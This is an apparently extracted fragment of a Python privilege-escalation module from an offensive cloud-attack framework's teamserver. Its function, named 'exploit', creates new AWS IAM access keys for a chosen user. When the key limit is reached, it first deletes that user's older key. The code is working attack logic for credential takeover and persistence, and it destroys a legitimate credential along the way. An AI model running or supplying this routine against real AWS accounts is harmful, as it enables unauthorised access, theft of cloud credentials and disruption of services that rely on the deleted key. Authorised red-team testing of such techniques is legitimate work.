# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\privesc\aws_iam_create_user_access_key.py
import random
import string
import sys
...
def exploit(profile, workspace):
    ...
    try:
        if not user == "":
            try:
                response = profile.create_access_key(UserName=user)
            except profile.exceptions.LimitExceededException:
                keys = profile.list_access_keys(UserName=user)["AccessKeyMetadata"]
                if keys[0]["CreateDate"] < keys[1]["CreateDate"]:
                    profile.delete_access_key(AccessKeyId=keys[0]["AccessKeyId"], UserName=user)
                    response = profile.create_access_key(UserName=user)
                else:
                    profile.delete_access_key(AccessKeyId=keys[1]["AccessKeyId"], UserName=user)
                    response = profile.create_access_key(UserName=user)
        else:
            try:
                response = profile.create_access_key()
            except profile.exceptions.LimitExceededException:
                keys = profile.list_access_keys()["AccessKeyMetadata"]
                if keys[0]["CreateDate"] < keys[1]["CreateDate"]:
                    profile.delete_access_key(AccessKeyId=keys[0]["AccessKeyId"])
                    response = profile.create_access_key()
                else:
                    profile.delete_access_key(AccessKeyId=keys[1]["AccessKeyId"])
                    response = profile.create_access_key()
